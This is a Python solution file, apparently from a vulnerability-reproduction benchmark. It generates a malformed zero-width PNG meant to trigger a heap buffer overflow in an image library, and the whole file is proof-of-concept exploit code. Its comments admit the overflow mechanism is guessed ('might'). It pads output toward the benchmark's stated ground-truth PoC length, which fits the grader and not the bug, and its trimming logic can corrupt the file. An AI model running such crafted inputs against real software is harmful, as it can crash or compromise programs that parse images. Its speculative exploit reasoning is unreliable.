import os
import struct
import zlib
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG file with zero width that triggers heap buffer overflow
        # PNG structure:
        # - PNG signature (8 bytes)
        # - IHDR chunk (width=0, height=1)
        # - IDAT chunk with compressed scanline data
        # - IEND chunk
        
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk - width=0, height=1, bit depth=8, color type=2 (RGB)
        # This creates an image with 0 width but non-zero height
        ihdr_data = struct.pack('>I', 0)    # width = 0
        ihdr_data += struct.pack('>I', 1)   # height = 1
        ihdr_data += b'\x08'                # bit depth = 8
        ihdr_data += b'\x02'                # color type = 2 (RGB)
        ihdr_data += b'\x00'                # compression method = 0
        ihdr_data += b'\x00'                # filter method = 0
        ihdr_data += b'\x00'                # interlace method = 0
        
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_chunk) & 0xffffffff)
        ihdr = struct.pack('>I', len(ihdr_data)) + ihdr_chunk + ihdr_crc
        
        # IDAT chunk - create compressed data that will cause overflow
        # For RGB with width=0, each scanline should be 1 byte (filter type) + 0*3 bytes = 1 byte
        # But we'll create malformed data that decompresses to more than expected
        
        # Create zlib compressed data that expands to much larger than expected
        # This exploits the lack of bounds checking when width=0
        scanline = b'\x00'  # Filter type 0
        
        # Create data that will overflow when processed
        # The vulnerability: when width=0, the buffer allocation might be incorrect
        # but the decompression still produces data that gets written beyond bounds
        
        # Create multiple scanlines worth of data (more than the 1 expected)
        raw_data = b''
        for i in range(100):  # Create 100 "scanlines" worth of data
            raw_data += scanline
            # Add some pixel data even though width=0
            # This is where the overflow happens - the library might try to process
            # this data assuming non-zero width
            raw_data += b'\x00' * 100  # Add extra data that will overflow
            
        # Compress the data
        compressed = zlib.compress(raw_data, level=9)
        
        idat_chunk = b'IDAT' + compressed
        idat_crc = struct.pack('>I', zlib.crc32(idat_chunk) & 0xffffffff)
        idat = struct.pack('>I', len(compressed)) + idat_chunk + idat_crc
        
        # IEND chunk
        iend_chunk = b'IEND'
        iend_crc = struct.pack('>I', zlib.crc32(iend_chunk) & 0xffffffff)
        iend = struct.pack('>I', 0) + iend_chunk + iend_crc
        
        # Combine all parts
        poc = png_signature + ihdr + idat + iend
        
        # The ground-truth PoC length is 2936 bytes
        # Pad or trim to match the expected length more closely
        target_length = 2936
        
        if len(poc) < target_length:
            # Pad with extra IDAT chunks to reach target length
            padding_needed = target_length - len(poc)
            # Create additional malformed data
            extra_data = b'\x00' * min(1000, padding_needed - 12)
            compressed_extra = zlib.compress(extra_data)
            
            extra_idat = b'IDAT' + compressed_extra
            extra_crc = struct.pack('>I', zlib.crc32(extra_idat) & 0xffffffff)
            extra_chunk = struct.pack('>I', len(compressed_extra)) + extra_idat + extra_crc
            
            poc = png_signature + ihdr + idat + extra_chunk + iend
            
        # Trim if too long (unlikely)
        if len(poc) > target_length:
            poc = poc[:target_length]
            
        return poc
